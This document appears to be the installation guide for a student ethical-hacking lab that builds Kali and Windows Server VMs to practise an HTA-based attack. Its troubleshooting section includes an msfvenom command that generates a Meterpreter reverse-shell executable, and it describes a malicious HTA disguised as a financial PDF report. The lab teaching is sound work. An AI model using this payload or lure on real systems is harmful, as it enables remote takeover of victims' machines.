# Installation Guide
## Ethical Hacking Lab - HTA Exploit

Complete step-by-step installation instructions for the HTA (HTML Application) exploit lab.

---

## Table of Contents

1. [System Requirements](#system-requirements)
2. [Pre-Installation](#pre-installation)
3. [Installing Prerequisites](#installing-prerequisites)
4. [Automated Installation](#automated-installation)
5. [Verification](#verification)
6. [Post-Installation](#post-installation)
7. [Troubleshooting](#troubleshooting)

---

## System Requirements

### Minimum Requirements

| Component | Requirement |
|-----------|-------------|
| **OS** | Windows 10/11, macOS 10.15+, Ubuntu 20.04+ |
| **CPU** | Intel VT-x or AMD-V capable processor |
| **RAM** | 8 GB |
| **Disk** | 40 GB free space |
| **Network** | Internet connection for initial setup |

### Recommended Requirements

| Component | Recommendation |
|-----------|----------------|
| **RAM** | 16 GB or more |
| **CPU** | 4+ cores |
| **Disk** | SSD with 60+ GB free |
| **Network** | Wired connection (faster downloads) |

---

## Pre-Installation

### 1. Enable Virtualization

**Check if enabled:**

**Linux:**
```bash
egrep -c '(vmx|svm)' /proc/cpuinfo
# Output > 0 = enabled
```

**macOS:**
```bash
sysctl -a | grep machdep.cpu.features | grep VMX
# Should show VMX
```

**Windows:**
```powershell
systeminfo | findstr /i "Hyper-V"
# Should show "Yes" or virtualization enabled
```

**If not enabled:**
- Reboot computer
- Enter BIOS/UEFI (usually F2, F10, or DEL during boot)
- Find "Virtualization Technology" or "VT-x" or "AMD-V"
- Enable it
- Save and reboot

---

### 2. Disable Hyper-V (Windows Only)

If using Windows, Hyper-V must be disabled for VirtualBox to work:

```powershell
# Run as Administrator
bcdedit /set hypervisorlaunchtype off
```

Reboot computer.

---

### 3. Free Up Disk Space

Ensure you have at least 40GB free:

**Linux/macOS:**
```bash
df -h
```

**Windows:**
```powershell
Get-PSDrive C
```

---

## Installing Prerequisites

### VirtualBox

**Linux (Ubuntu/Debian):**
```bash
# Add Oracle VirtualBox repository
wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc -O- | sudo apt-key add -
echo "deb [arch=amd64] https://download.virtualbox.org/virtualbox/debian $(lsb_release -sc) contrib" | sudo tee /etc/apt/sources.list.d/virtualbox.list

# Install VirtualBox
sudo apt update
sudo apt install virtualbox-7.0
```

**macOS:**
```bash
# Using Homebrew
brew install --cask virtualbox

# Or download from: https://www.virtualbox.org/wiki/Downloads
```

**Windows:**
1. Download installer: https://www.virtualbox.org/wiki/Downloads
2. Run installer as Administrator
3. Follow installation wizard
4. Reboot if prompted

**Verify installation:**
```bash
VBoxManage --version
# Should show version 7.0.x or higher
```

---

### Vagrant

**Linux (Ubuntu/Debian):**
```bash
# Download and install Vagrant
wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
sudo apt update && sudo apt install vagrant
```

**macOS:**
```bash
# Using Homebrew
brew install vagrant

# Or download from: https://www.vagrantup.com/downloads
```

**Windows:**
1. Download installer: https://www.vagrantup.com/downloads
2. Run installer as Administrator
3. Follow installation wizard
4. Reboot if prompted

**Verify installation:**
```bash
vagrant --version
# Should show version 2.3.x or higher
```

---

### Git (Optional but Recommended)

**Linux:**
```bash
sudo apt install git
```

**macOS:**
```bash
brew install git
```

**Windows:**
Download from: https://git-scm.com/download/win

---

## Automated Installation

### Step 1: Clone Repository

**With Git:**
```bash
git clone https://github.com/gcheliz/ethical-hacking-student-lab.git
cd ethical-hacking-student-lab
```

**Without Git:**
1. Download ZIP: https://github.com/gcheliz/ethical-hacking-student-lab/archive/refs/heads/master.zip
2. Extract to a folder
3. Open terminal in that folder

---

### Step 2: Run Setup Script

**Linux/macOS:**
```bash
./setup.sh
```

**Windows (PowerShell - Run as Administrator recommended):**
```powershell
.\setup.ps1
```

---

### What the Setup Script Does

```
[1/7] Checking prerequisites
  - Verifies VirtualBox installed
  - Verifies Vagrant installed
  - Checks disk space (40+ GB)
  - Checks memory (8+ GB)

[2/7] Preparing exploits directory
  - Creates exploits folder structure
  - Prepares for payload generation

[3/7] Configuring VirtualBox network
  - Creates host-only network (192.168.56.0/24)
  - Configures network adapter
  - Disables DHCP

[4/7] Building Kali Linux VM (5-10 minutes)
  - Downloads Kali Linux box (~3 GB)
  - Creates VM with 3GB RAM, 2 CPUs
  - Configures network (192.168.56.101)
  - Installs Metasploit and tools
  - Generates Meterpreter EXE payload
  - Generates malicious HTA file
  - Sets up HTTP server (auto-starts on boot)

[5/7] Building Windows Server 2008 R2 VM (20-30 minutes)
  - Downloads Windows box (~5 GB)
  - Creates VM with 4GB RAM, 2 CPUs
  - Configures network (192.168.56.102)
  - Disables all security features
  - Tests connectivity to Kali

[6/7] Verifying network connectivity
  - Tests Kali → Windows (ping)
  - Tests Windows → Kali (ping)
  - Verifies network configuration

[7/7] Creating snapshots
  - Creates "Clean_State" snapshot for Kali
  - Creates "Clean_State" snapshot for Windows
  - Allows easy reset after exploitation
```

**Total Time: 15-30 minutes** (depending on internet speed)

---

## Verification

### Check VM Status

```bash
cd vagrant
vagrant status
```

Expected output:
```
Current machine states:

kali                      running (virtualbox)
win2k8                    running (virtualbox)
```

---

### Verify Network Connectivity

**From Kali:**
```bash
vagrant ssh kali
ping -c 4 192.168.56.102
```

Expected: `4 packets transmitted, 4 received, 0% packet loss`

---

### Verify Exploit Files

```bash
vagrant ssh kali
ls -la /vagrant/exploits/hta/
```

Expected files:
```
update.exe                      # Meterpreter EXE payload
Q4_Financial_Report_EXE.pdf.hta # Malicious HTA file
start_hta_attack.sh             # Attack automation script
README.md                       # Instructions
```

---

## Post-Installation

### First Attack Test

```bash
# 1. SSH into Kali
cd vagrant
vagrant ssh kali

# 2. Navigate to HTA exploits
cd /vagrant/exploits/hta

# 3. Start the attack
./start_hta_attack.sh

# 4. In Windows VM, double-click "Download_Exploit_from_Kali" on Desktop
# 5. Double-click the downloaded "Q4_Financial_Report.pdf"
# 6. Meterpreter session should open!
```

---

### Create Clean Snapshot (if needed)

If you made changes and want to create a new baseline:

```bash
cd vagrant

# Stop VMs
vagrant halt

# Create snapshot
VBoxManage snapshot "Kali_Exploit_Lab_XXXXX" take "My_Clean_State"
VBoxManage snapshot "Windows_Exploit_Target_XXXXX" take "My_Clean_State"
```

---

## Troubleshooting

### VirtualBox Installation Issues

**Error: "VT-x is disabled"**
- Solution: Enable virtualization in BIOS

**Error: "VirtualBox kernel driver not loaded"**
```bash
# Linux
sudo modprobe vboxdrv

# If fails, reinstall:
sudo /sbin/vboxconfig
```

**macOS: "System Extension Blocked"**
- Go to System Preferences → Security & Privacy
- Click "Allow" for Oracle VirtualBox

---

### Vagrant Issues

**Error: "Vagrant failed to initialize"**
```bash
# Reinstall Vagrant plugins
vagrant plugin expunge --reinstall
```

**Error: "Box download fails"**
- Check internet connection
- Try manual download and add:
```bash
vagrant box add kalilinux/rolling /path/to/downloaded/box
```

---

### Network Configuration Issues

**VMs can't communicate:**
```bash
# On host, verify host-only network exists
VBoxManage list hostonlyifs

# If missing, recreate:
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0

# Then destroy and rebuild VMs
cd vagrant
vagrant destroy -f
vagrant up
```

**Kali network not configured:**
```bash
# SSH into Kali
vagrant ssh kali

# Check network interface
ip addr show

# Manually configure if needed
sudo ip addr add 192.168.56.101/24 dev eth1
sudo ip link set eth1 up
```

---

### Windows VM Issues

**Windows VM won't boot:**
- Increase timeout in Vagrantfile:
```ruby
win.vm.boot_timeout = 900  # 15 minutes
```

**WinRM timeout:**
- Check firewall on host
- Verify NAT adapter is working
- Try: `vagrant reload win2k8`

---

### Exploit Generation Issues

**HTA file not created:**
```bash
# SSH into Kali
vagrant ssh kali

# Manually run provisioning script
cd /vagrant/vagrant/provisioning/kali
./create_hta_exploit.sh
```

**EXE payload missing:**
```bash
# Generate manually
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.56.101 \
    LPORT=4444 \
    -a x64 \
    --platform windows \
    -f exe \
    -o /vagrant/exploits/hta/update.exe
```

---

### Disk Space Issues

**Cleanup old boxes:**
```bash
# Remove unused boxes
vagrant box prune

# Remove specific box
vagrant box remove kalilinux/rolling
vagrant box remove rapid7/metasploitable3-win2k8
```

**Compact VMs:**
```bash
# Compact Kali VM
VBoxManage modifymedium disk /path/to/kali.vdi --compact

# Compact Windows VM
VBoxManage modifymedium disk /path/to/windows.vdi --compact
```

---

### Complete Reinstallation

If everything fails:

```bash
# 1. Destroy everything
cd vagrant
vagrant destroy -f

# 2. Remove boxes
vagrant box remove kalilinux/rolling --all
vagrant box remove rapid7/metasploitable3-win2k8 --all

# 3. Remove VirtualBox network
VBoxManage hostonlyif remove vboxnet0

# 4. Clean Vagrant cache
rm -rf ~/.vagrant.d/boxes/*

# 5. Start fresh
cd ..
./setup.sh
```

---

## Platform-Specific Notes

### macOS

- **M1/M2 (Apple Silicon)**: VirtualBox does not support ARM architecture. Use alternatives:
  - UTM (QEMU-based virtualization)
  - Parallels Desktop (commercial)
  - VMware Fusion (commercial)

- **Permissions**: Grant VirtualBox permissions in System Preferences

### Windows

- **Windows Home**: Hyper-V is not available, use VirtualBox
- **Windows Pro/Enterprise**: Disable Hyper-V before using VirtualBox
- **Antivirus**: May flag exploit files as malicious (expected behavior)

### Linux

- **Kernel Updates**: May require rebuilding VirtualBox kernel modules:
```bash
sudo /sbin/vboxconfig
```

- **Permissions**: Add user to vboxusers group:
```bash
sudo usermod -aG vboxusers $USER
# Logout and login again
```

---

## Next Steps

Once installation is complete:

1. Read [exploits/hta/README.md](exploits/hta/README.md) for attack details
2. Read [HOW_TO_USE.md](HOW_TO_USE.md) for usage instructions
3. Run your first attack
4. Explore Meterpreter commands
5. Practice defensive measures

---

## Getting Help

If installation fails:

1. Check [TROUBLESHOOTING.md](TROUBLESHOOTING.md)
2. Check [docs/NETWORK_DEBUGGING_GUIDE.md](docs/NETWORK_DEBUGGING_GUIDE.md)
3. Review this guide's troubleshooting section
4. Open GitHub issue with:
   - Your OS and version
   - VirtualBox and Vagrant versions
   - Error messages (full output)
   - Steps to reproduce

---

**Installation complete? Start attacking! See [HOW_TO_USE.md](HOW_TO_USE.md)**

---

*Last Updated: 2026-01-10*
*Version: 2.0 - HTA Exploit Lab*
